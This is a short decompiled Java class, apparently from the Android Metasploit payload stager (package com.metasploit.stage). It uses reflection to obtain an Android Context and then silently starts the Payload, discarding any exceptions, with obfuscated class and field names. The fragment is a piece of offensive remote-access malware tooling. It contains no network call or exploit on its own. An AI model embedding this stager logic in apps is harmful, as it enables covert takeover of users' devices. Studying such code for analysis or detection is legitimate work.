package com.metasploit.stage;

import android.content.Context;
import java.lang.reflect.Method;

final class d implements Runnable {
    private /* synthetic */ Method a;

    d(Method method) {
        this.a = method;
    }

    public final void run() {
        try {
            Context context = (Context) this.a.invoke(null, null);
            if (context != null) {
                Payload.start(context);
            }
        } catch (Exception e) {
        }
    }
}
